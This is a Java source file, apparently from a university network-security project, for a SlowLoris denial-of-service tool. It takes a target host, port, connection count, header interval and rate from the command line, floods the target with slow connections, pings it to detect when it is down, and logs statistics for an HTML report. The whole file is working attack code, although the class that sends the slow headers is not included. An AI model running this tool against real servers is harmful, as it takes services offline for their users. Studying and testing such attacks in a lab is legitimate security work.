package in.ac.iiitd.ns;

import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.concurrent.Executor;
import java.util.concurrent.Executors;

public class SlowLoris {

    public static final boolean DEBUG = true;

    // Global Parameters for statistics;
    private int pending;
    private int connected;
    private int closed;
    private boolean isAvailable;

    // Global parameters for attacking a hostname
    private final String hostname;
    private final int port;
    private final int connections;
    private final int interval;	
    private final int time;
    private final int rate;
    private final int timeout;

    public static ArrayList<Stats> stats;

    /** List of Command Line Arguments */
    final static HashMap<String, String> CLA = new HashMap<String, String>();

    final static String USEAGE = "-h hostname -p port "
            + "-c No_of_connections -i Interval_Between_Headers_in_ms"
            + "-t test_Duration -r connections_per_s"
            + "-d Output_directory -o probe Timeout";

    private final Executor exec;

    // Set Default Vlaues 
    static{
        CLA.put("-h", "localhost");     // hostname
        CLA.put("-p", "80");            // port
        CLA.put("-c", "50");            // No. of connections
        CLA.put("-i", "10000");         // interval between headers
        CLA.put("-t", "60");            // Test Timeout in seconds
        CLA.put("-r", "50");            // Connections per seconds
        CLA.put("-d", "");              // Directory to output file
        CLA.put("-o", "5000");          // Ping Timeout
    }

    public static enum UPDATE_TYPE{
        ERROR, CLOSED, CONNECTED
    }

    private Runnable UPDATE_STATS = new Runnable() {

        @Override
        public void run() {
            // TODO Auto-generated method stub
            for(int i = 0; ; i++){
                stats.add(new Stats("" + i, closed, pending, connected, isAvailable?connections:0));
                try {
                    Thread.sleep(995);
                } catch (InterruptedException e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                }
            }
        }
    };

    
    private Runnable ping = new Runnable() {

        @Override
        public void run() {
            // TODO Auto-generated method stub

            while(true){
                try {
                    HttpURLConnection connection = (HttpURLConnection) new URL(hostname).openConnection();
                    connection.setConnectTimeout(timeout);
                    connection.setReadTimeout(timeout);
                    connection.setRequestMethod("HEAD");
                    int responseCode = connection.getResponseCode();
                    if (200 <= responseCode && responseCode <= 399){
                        clearDOSed();
                    }
                } catch (IOException exception) {
                    setDOSed();
                } catch(Exception e){
                    if(DEBUG)
                        e.printStackTrace();
                }

                try {
                    Thread.sleep(500);
                } catch (InterruptedException e) {
                    // TODO Auto-generated catch block
                    if(DEBUG)
                        e.printStackTrace();
                }
            }
        }
    };

    public synchronized void update(UPDATE_TYPE type){

        switch(type){
            case CONNECTED: 
                pending--;
                connected++;
                break;
            case CLOSED:
                connected--;
                closed++;
                break;
            default: 
                break;
        }
    }

    public void setDOSed(){
        isAvailable = false;
    }

    public void clearDOSed(){
        isAvailable = true;
    }

    public SlowLoris(String[] args){
        processInput(args);
        exec = Executors.newCachedThreadPool();
        stats = new ArrayList<Stats>();

        this.hostname = CLA.get("-h");
        this.port = getCLAInt("-p");
        this.connections = getCLAInt("-c");
        this.interval = getCLAInt("-i");
        this.time = getCLAInt("-t") * 1000;
        this.rate = getCLAInt("-r");
        this.timeout = getCLAInt("-o");

        pending = connections;
        connected = 0;
        closed = 0;
        isAvailable = true;		
    }

    public void attack(){
        long sTime = System.currentTimeMillis() - 500;
        int i = 0;

        // To perform Http PING repeatedly 
        new Thread(ping).start();
        
        // To Save the network snapshots in the interval of 1s
        new Thread(UPDATE_STATS).start();
        
        while(System.currentTimeMillis() - sTime < time){
            for(int r = 0; r < rate && isAvailable; r++) {
                exec.execute(new Connection(hostname, port, interval, this, i += 3));
            }

            try {
                Thread.sleep(500);
            } catch (InterruptedException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
        }
        
        Stats.genHTML();
    }

    private static int getCLAInt(String key) {
        // TODO Auto-generated method stub
        return Integer.parseInt(CLA.get(key));
    }

    /**
     * Process the input and Sets the appropriate arguments It doesn't do any checks
     * @param args
     */
    private static void processInput(String[] args) {
        // TODO Auto-generated method stub
        if(args.length % 2 != 0){
            System.out.println(USEAGE);
            System.exit(0);
        } 
        else{
            for(int i = 0; i < args.length; i += 2){
                CLA.put(args[i], args[i+1]);
            }
        }

    }

}
